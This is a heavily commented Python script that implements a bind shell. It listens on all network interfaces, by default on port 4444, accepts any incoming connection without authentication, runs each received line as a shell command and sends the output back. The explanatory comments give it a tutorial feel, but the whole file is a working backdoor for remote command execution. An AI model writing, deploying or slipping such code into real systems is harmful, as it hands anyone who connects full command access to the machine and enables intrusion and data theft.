#!/usr/bin/env python3

import click # Import the click library for creating command-line interfaces
import socket # Import the socket module for network operations
import subprocess # Import the subprocess module to run system commands
from threading import Thread # Import the Thread class for handling multiple clients concurrently

def run_cmd(cmd):
    """
    Executes a shell command and returns its standard output.

    Args:
        cmd (str): The shell command to execute.

    Returns:
        bytes: The standard output of the command as bytes.
    """
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) # Execute the command using subprocess.run
    # shell=True is used to interpret cmd as a shell command
    # stdout and stderr are captured as pipes to retrieve the output.
    return output.stdout # Return the standard output of the command

def handle_input(client_socket):
    """
    Handles input from a client socket in a dedicated thread.

    Receives commands from the client, executes them, and sends back the output.

    Args:
        client_socket (socket.socket): The socket connected to the client.
    """
    while True: # Enter an infinite loop to continuously handle client input
        chunks = [] # Initialize an empty list to store received data chunks
        chunk = client_socket.recv(2048) # Receive up to 2048 bytes of data from the client
        chunks.append(chunk) # Append the received chunk to the list

        # Receive data in chunks until a newline character is found or connection is closed
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048) # Receive the next chunk of data
            chunks.append(chunk) # Append the new chunk

        cmd = (b''.join(chunks)).decode()[:-1] # Join all received byte chunks, decode to string, and remove the trailing newline character
        # b''.join(chunks) concatenates all the byte chunks into a single byte string.
        # .decode() converts the byte string to a regular string.
        # [:-1] slices the string to remove the last character (the newline character).

        if cmd.lower() == 'exit': # Check if the received command (case-insensitive) is 'exit'
            client_socket.close() # Close the connection with the client
            break # Exit the while loop, terminating the thread for this client

        output = run_cmd(cmd) # Execute the received command using the run_cmd function
        client_socket.sendall(output) # Send the standard output of the command back to the client
        # sendall ensures that all data is sent over the socket.

@click.command() # Decorator to make the main function a click command-line interface command
@click.option('--port', '-p', default=4444, help='Specify a port to establish connection') # Option to specify the listening port, default is 4444
def main(port):
    """
    Main function to set up the server socket and handle incoming client connections.

    Args:
        port (int): The port number to listen on.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object
    # socket.AF_INET: Address Family for IPv4.
    # socket.SOCK_STREAM: Socket type for TCP (connection-oriented, reliable byte streams).
    s.bind(('0.0.0.0', port)) # Bind the socket to all interfaces (0.0.0.0) on the specified port
    # '0.0.0.0' means listen on all available network interfaces.
    s.listen(4) # Start listening for incoming connections, with a backlog of 4 (max queued connections)

    while True: # Enter an infinite loop to accept incoming client connections
        client_socket, address = s.accept() # Accept a new connection. Blocks until a client connects.
        # client_socket: a new socket object to communicate with the client.
        # address: a tuple containing the client's address (IP address and port).
        t = Thread(target=handle_input, args=(client_socket, )) # Create a new thread to handle input from the client
        # target=handle_input: function to be executed in the thread.
        # args=(client_socket, ): arguments to be passed to the handle_input function (must be a tuple).
        t.start() # Start the new thread, allowing concurrent handling of clients
        print(f'[*] Connection established from {address[0]}:{address[1]}') # Print a message indicating a new connection and client address

if __name__ == '__main__':
    main() # Execute the main function when the script is run directly
